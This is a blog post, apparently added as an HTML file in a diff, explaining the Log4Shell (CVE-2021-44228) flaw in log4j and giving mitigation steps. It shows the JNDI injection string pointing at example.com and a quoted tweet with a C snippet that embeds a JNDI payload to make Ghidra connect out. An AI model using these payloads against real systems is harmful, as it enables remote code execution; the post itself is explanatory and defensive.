@@ -1,0 +1,182 @@
+<!doctype html>
+<html>
+  <head>
+    <meta charset="utf-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <link rel="stylesheet" href="/assets/css/styles.css">
+    <style>
+      .sideline {
+        position: absolute;
+        width: 100%;
+        top: 0;
+        left: 0;
+        pointer-events: none;
+        display: none;
+      }
+      
+      @media (hover: hover) and (min-width: 1081px) {
+          .sidenote:hover + .sideline {
+            display: block;
+          }
+          .sidenote-number:hover + .margin-toggle + .sidenote + .sideline {
+            display: block;
+          }
+      }
+      </style>
+    <script src="/assets/js/sideline.js"></script>
+    <link type="application/atom+xml" rel="alternate" href="smodnix.github.io/feed.xml" title="smodnix&apos;s blog" />
+    <!-- Begin Jekyll SEO tag v2.8.0 -->
+<title>Entry 2 | smodnix’s blog</title>
+<meta name="generator" content="Jekyll v4.4.1" />
+<meta property="og:title" content="Entry 2" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="Yesterday, a high severity vulnerabilityCVE-2021-44228 was discovered in the popular Java logging library log4jApache Log4j that could lead to remote code execution (RCE)." />
+<meta property="og:description" content="Yesterday, a high severity vulnerabilityCVE-2021-44228 was discovered in the popular Java logging library log4jApache Log4j that could lead to remote code execution (RCE)." />
+<link rel="canonical" href="smodnix.github.io/logs/entry-2" />
+<meta property="og:url" content="smodnix.github.io/logs/entry-2" />
+<meta property="og:site_name" content="smodnix’s blog" />
+<meta property="og:type" content="article" />
+<meta property="article:published_time" content="2021-12-10T00:00:00+00:00" />
+<meta name="twitter:card" content="summary" />
+<meta property="twitter:title" content="Entry 2" />
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"BlogPosting","dateModified":"2021-12-10T00:00:00+00:00","datePublished":"2021-12-10T00:00:00+00:00","description":"Yesterday, a high severity vulnerabilityCVE-2021-44228 was discovered in the popular Java logging library log4jApache Log4j that could lead to remote code execution (RCE).","headline":"Entry 2","mainEntityOfPage":{"@type":"WebPage","@id":"smodnix.github.io/logs/entry-2"},"url":"smodnix.github.io/logs/entry-2"}</script>
+<!-- End Jekyll SEO tag -->
+
+  </head>
+  <body>
+    <input type="checkbox" id="lightswitch">
+    <div id="body">
+      <div id="container">
+    <header>
+      
+<nav>
+  <label for="lightswitch" id="lightswitch-label">☀</label>
+    
+    |
+      <a href="/" class="current">Home</a>
+    
+    |
+      <a href="/about" class="current">About</a>
+    
+    |
+      <a href="/files/IlkinGasimov_Resume.pdf" class="current">Résumé</a>
+    
+    |
+      <a href="/logs" class="current">Logs</a>
+    
+    |
+      <a href="/posts" class="current">Posts</a>
+    
+    |
+</nav>
+
+      <hr>
+    </header>
+    <section>
+      <h1>Entry 2</h1>
+<b>Published</b>: <span class="intro">Dec 10th, 2021</span>
+
+<p>Yesterday, a high severity vulnerability<label for="1" class="margin-toggle sidenote-number"></label><input type="checkbox" id="1" class="margin-toggle" /><span class="sidenote"><a href="https://wiki2.org/en/Log4j" target="_blank" rel="noopener noreferrer">CVE-2021-44228</a> </span> was discovered in the popular Java logging library log4j<label for="2" class="margin-toggle sidenote-number"></label><input type="checkbox" id="2" class="margin-toggle" /><span class="sidenote"><a href="https://wiki2.org/en/Log4j" target="_blank" rel="noopener noreferrer">Apache Log4j</a> </span> that could lead to remote code execution (RCE).</p>
+
+<p><span class="newthought">A few notes</span></p>
+
+<p>The log4j package uses JNDI<label for="3" class="margin-toggle sidenote-number"></label><input type="checkbox" id="3" class="margin-toggle" /><span class="sidenote"><a href="https://wiki2.org/en/Java_Naming_and_Directory_Interface" target="_blank" rel="noopener noreferrer">Java Naming and Directory Interface</a> </span>. It is a standard API for directory service that allows a Java program to find data (in the form of a Java object) through a directory.</p>
+
+<p>A Java program can use JNDI and LDAP together to find a Java object containing data that it might need. For example, in the standard Java documentation there’s an <a href="https://docs.oracle.com/javase/jndi/tutorial/getStarted/examples/directory.html" target="_blank" rel="noopener noreferrer">example</a> that talks to an LDAP server to retrieve attributes from an object. It uses the URL <code class="language-plaintext highlighter-rouge">ldap://localhost:389/o=JNDITutorial</code> to find the JNDITutorial object from an LDAP server running on the same machine (localhost) on port 389 and goes on to read attributes from it.</p>
+
+<p>As the tutorial says <em>“If your LDAP server is located on another machine or is using another port, then you need to edit the LDAP URL”</em>. Thus the LDAP server could be running on a different machine and potentially anywhere on the Internet. That flexibility means that if an attacker could control the LDAP URL they’d be able to cause a Java program to load an object from a server under their control.</p>
+
+<p>But in the case of log4j an attacker can control the LDAP URL by causing log4j to try to write a string like ${jndi:ldap://example.com/a}. If that happens then log4j will connect to the LDAP server at example.com and retrieve the object.</p>
+
+<p>This happens because log4j contains <a href="https://logging.apache.org/log4j/2.x/manual/configuration.html#PropertySubstitution" target="_blank" rel="noopener noreferrer">special syntax</a> in the form ${prefix:name} where prefix is one of a number of different <a href="https://logging.apache.org/log4j/2.x/manual/lookups.html" target="_blank" rel="noopener noreferrer">Lookups</a> where name should be evaluated. For example, ${java:version} is the current running version of Java.</p>
+
+<p><span class="newthought">Impact</span></p>
+
+<p>Many services are vulnerable to this exploit. Cloud services like Amazon, Steam, Apple iCloud, Cloudflare, Twitter etc. and apps like Druid, Minecraft, ElasticSearch, Struts2, Solr have already been found to be vulnerable.</p>
+
+<p>Ghidra’s vulnerable too:</p>
+
+<blockquote class="twitter-tweet"><p lang="en" dir="ltr">Ghidra&#39;s vulnerable to log4j:<br />__attribute__((__section__(&quot;.note.${jndi:ldap://127.0.0.1:1234/abc}&quot;)))<br />int a = 1;<br />int main(){}<br />$ gcc hello.c<br />$ nc -l 1234<br />Load into Ghidra; it connects to 127.0.0.1:1234.<br />Ghidra 10.0.2, macOS OpenJDK Corretto 11.0.4.11.1<a href="https://t.co/Qu1psCjtY6">https://t.co/Qu1psCjtY6</a></p>&mdash; Zhuowei Zhang (@zhuowei) <a href="https://twitter.com/zhuowei/status/1469186818549719042?ref_src=twsrc%5Etfw">December 10, 2021</a></blockquote>
+<script async="" src="https://platform.twitter.com/widgets.js" charset="utf-8"></script>
+
+<p>And the gist of it comes down to:</p>
+
+<blockquote class="twitter-tweet"><p lang="en" dir="ltr">The lesson of Java is that some of the best engineers at the time created a secure byte-code VM and JIT, only for Design-By-Committee to come in and say &quot;maybe someone would want the Logger to load remote code via JNDI and LDAP. Let&#39;s add that!&quot;.</p>&mdash; postmodern (@postmodern_mod3) <a href="https://twitter.com/postmodern_mod3/status/1469401307005939712?ref_src=twsrc%5Etfw">December 10, 2021</a></blockquote>
+<script async="" src="https://platform.twitter.com/widgets.js" charset="utf-8"></script>
+
+<p><span class="newthought">Mitigation</span></p>
+
+<ol>
+  <li>
+    <p>Upgrading to <a href="https://logging.apache.org/log4j/2.x/download.html" target="_blank" rel="noopener noreferrer">new version</a>.</p>
+  </li>
+  <li>
+    <p>If you can’t upgrade, set the property:</p>
+  </li>
+</ol>
+
+<figure class="highlight"><pre><code class="language-bash" data-lang="bash">log4j2.formatMsgNoLookups<span class="o">=</span><span class="nb">true</span></code></pre></figure>
+
+<ul>
+  <li>If none of the above works, you can remove the <code class="language-plaintext highlighter-rouge">JndiLookup</code> class from the classpath:</li>
+</ul>
+
+<figure class="highlight"><pre><code class="language-bash" data-lang="bash">zip <span class="nt">-q</span> <span class="nt">-d</span> log4j-core-<span class="k">*</span>.jar org/apache/logging/log4j/core/lookup/JndiLookup.class</code></pre></figure>
+
+<p>This command will remove the class from the log4j-core.</p>
+
+<p><span class="newthought">Keypoints</span></p>
+
+<p>The underlying truth behind impact is:</p>
+
+<figure><img src="https://imgs.xkcd.com/comics/dependency.png" /><figcaption class="maincolumn-figure"><em>Dependency</em>, from <a href="https://xkcd.com/2347/" target="_blank" rel="noopener noreferrer">xkcd</a></figcaption></figure>
+
+<hr />
+
+<p><span class="newthought">Further Information</span></p>
+
+<ul>
+  <li><a href="https://www.lunasec.io/docs/blog/log4j-zero-day/" target="_blank" rel="noopener noreferrer">Log4Shell: RCE 0-day exploit found in log4j2, a popular Java logging package</a></li>
+  <li><a href="https://news.ycombinator.com/item?id=29504755" target="_blank" rel="noopener noreferrer">https://news.ycombinator.com/item?id=29504755</a></li>
+  <li><a href="https://www-cnblogs-com.translate.goog/yyhuni/p/15088134.html?_x_tr_sl=auto&amp;_x_tr_tl=en&amp;_x_tr_hl=en-US" target="_blank" rel="noopener noreferrer">JNDI injection and utilization after 8u191</a></li>
+  <li><a href="https://blog.cloudflare.com/inside-the-log4j2-vulnerability-cve-2021-44228/" target="_blank" rel="noopener noreferrer">Inside the log4j2 vulnerability (CVE-2021-44228)</a></li>
+  <li><a href="https://blog.cloudflare.com/cve-2021-44228-log4j-rce-0-day-mitigation/" target="_blank" rel="noopener noreferrer">Log4j RCE 0-day mitigation</a></li>
+  <li><a href="https://github.com/tangxiaofeng7/apache-log4j-poc" target="_blank" rel="noopener noreferrer">Apache-Log4j Exploit</a></li>
+  <li><a href="https://github.com/YfryTchsGD/Log4jAttackSurface" target="_blank" rel="noopener noreferrer">Log4j Attack Surface</a></li>
+  <li><a href="https://www.veracode.com/blog/research/exploiting-jndi-injections-java" target="_blank" rel="noopener noreferrer">Exploiting JNDI Injections in Java</a></li>
+</ul>
+
+
+
+    </section>
+
+      
+<footer id="footer">
+    <hr>
+    <i>Site proudly generated by
+    <a href="https://jekyllrb.com/">Jekyll</a> & hosted on <a href="https://pages.github.com/">Github</a></i> | <a href="/feed.xml">RSS</a> | <a href="https://html5.validator.nu/?doc=https://smodnix.github.io/"><b>This page is valid HTML</b></a>
+</footer>
+      </div>
+  </div>
+  
+  <!-- Colour theme switcher -->
+  <script>
+    const themeSwitch = document.querySelector('#lightswitch');
+    themeSwitch.checked = localStorage.getItem('switchedTheme') === 'true';
+
+    themeSwitch.addEventListener('change', function (e) {
+        if(e.currentTarget.checked === true) {
+            // Add item to localstorage
+            localStorage.setItem('switchedTheme', 'true');
+        } else {
+            // Remove item if theme is switched back to normal
+            localStorage.removeItem('switchedTheme');
+        }
+    });
+  </script>
+  <!-- Privacy-aware analytics by https://www.goatcounter.com/ -->
+  <script data-goatcounter="https://smod.goatcounter.com/count" async src="//gc.zgo.at/count.js"></script>
+  </body>
+</html>
